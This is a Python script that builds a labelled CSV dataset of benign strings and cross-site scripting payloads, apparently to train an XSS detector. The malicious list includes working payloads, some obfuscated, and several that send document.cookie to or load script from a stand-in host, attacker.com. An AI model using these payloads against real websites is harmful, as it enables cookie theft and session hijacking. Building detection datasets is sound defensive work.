import os
import pandas as pd

def generate_large_dataset():
    data_dir = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(data_dir, exist_ok=True)
    dataset_path = os.path.join(data_dir, "xss_dataset.csv")

    # Base Benign Templates to expand into 500+ samples
    benign_samples = [
        "Hello, world!", "Please contact support@company.com for help.",
        "The quick brown fox jumps over the lazy dog.", "Product ID: 1029384",
        "Search query: standard laptop 15 inch", "User age: 28, Location: NY",
        "Comment: Great article! Thanks for sharing.", "Order #98421 confirmed.",
        "Price range: $100 - $500", "Category: Electronics & Hardware",
        "Address: 123 Main Street, Apt 4B", "Feedback: Excellent service and delivery.",
        "Python is a versatile programming language.", "JSON response: {'status': 'success'}",
        "URL param: page=2&sort=asc", "Title: Understanding Machine Learning Basics"
    ]
    
    # Expand benign samples with variations
    expanded_benign = []
    for i in range(35):
        for sample in benign_samples:
            expanded_benign.append(f"{sample} (Ref: {i*10 + len(sample)})")

    # Base Malicious Payloads (Script, Event Handler, URI, Obfuscated, DOM-based, Encoded)
    malicious_base = [
        "<script>alert(1)</script>",
        "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<body onload=alert(document.cookie)>",
        "<a href=\"javascript:eval(atob('YWxlcnQoMSk='))\">Click here</a>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<script src=http://attacker.com/xss.js></script>",
        "\"-alert(1)-\"",
        "<marquee onstart=alert(1)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*[]/*---+生命-alert(1)//'>",
        "<object data=\"javascript:alert(1)\">",
        "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "<script>eval(name)</script>",
        "<a href=\"#\" onclick=\"document.location='http://attacker.com/cookie?c='+document.cookie\">Claim Prize</a>"
    ]

    # Expand malicious samples
    expanded_malicious = []
    for i in range(30):
        for payload in malicious_base:
            expanded_malicious.append(f"{payload} <!-- test_id_{i} -->")

    # Build DataFrame
    df_benign = pd.DataFrame({"text": expanded_benign, "label": 0})
    df_malicious = pd.DataFrame({"text": expanded_malicious, "label": 1})
    df = pd.concat([df_benign, df_malicious], ignore_index=True).sample(frac=1, random_state=42).reset_index(drop=True)

    df.to_csv(dataset_path, index=False)
    print(f"✅ Generated dataset with {len(df)} samples ({len(df_benign)} Benign, {len(df_malicious)} Malicious) at {dataset_path}")

if __name__ == "__main__":
    generate_large_dataset()
